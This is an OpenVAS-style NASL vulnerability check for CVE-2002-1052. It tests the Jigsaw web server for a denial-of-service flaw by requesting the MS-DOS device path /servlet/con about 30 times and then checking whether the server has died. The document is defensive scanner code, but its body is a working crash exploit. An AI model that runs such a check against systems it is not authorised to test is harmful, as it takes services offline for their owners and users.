if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11047" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 5251, 5258 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_cve_id( "CVE-2002-1052" );
	script_name( "Jigsaw webserver MS/DOS device DoS" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2002 Michel Arboi" );
	script_family( "Denial of Service" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Upgrade your software." );
	script_tag( name: "summary", value: "It was possible to crash the Jigsaw web
  server by requesting /servlet/con about 30 times." );
	script_tag( name: "impact", value: "An attacker may use this attack to make this
  service crash continuously." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
if(http_is_dead( port: port )){
	exit( 0 );
}
count = 0;
req = http_get( item: "/servlet/con", port: port );
for(i = 0;i < 32;i++){
	soc = http_open_socket( port );
	if(!soc){
		continue;
	}
	count++;
	send( socket: soc, data: req );
	http_recv( socket: soc );
	http_close_socket( soc );
}
if(count > 20 && http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

